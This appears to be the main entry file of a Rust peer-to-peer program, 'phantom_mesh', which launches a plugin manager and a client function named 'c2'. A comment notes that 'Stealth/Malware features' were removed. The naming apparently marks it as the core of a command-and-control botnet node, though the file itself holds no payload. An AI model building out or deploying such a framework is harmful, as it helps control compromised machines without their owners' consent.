mod config;
mod helpers;
mod p2p;
mod logic;
mod modules;
mod discovery;

// host and security modules removed (Stealth/Malware features)

use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "phantom_mesh")]
#[command(about = "Phantom Mesh Node (Pure P2P)", long_about = None)]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Manual Connect
    Connect { peer: String },
}

#[tokio::main]
async fn main() {
    println!("[*] Phantom Mesh Node Starting (Foreground via WebRTC/QUIC)...");

    // Install Rustls Crypto Provider (Ring)
    let _ = rustls::crypto::ring::default_provider().install_default();
    common::time::TimeKeeper::init().await;

    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Connect { peer }) => {
            println!("[*] Connecting to peer: {}", peer);
            if let Err(e) = p2p::c2::start_client(Some(peer)).await {
                eprintln!("Connect Error: {}", e);
            }
        }
        None => {
            println!("[*] Starting P2P Node...");
            
            // 1. Start Plugin Manager
            tokio::spawn(async {
                modules::plugin_manager::run_plugin_manager().await;
            });

            // 2. Start C2 (Blocking)
            if let Err(e) = p2p::c2::start_client(None).await {
                eprintln!("C2 Error: {}", e);
            }
        }
    }
}
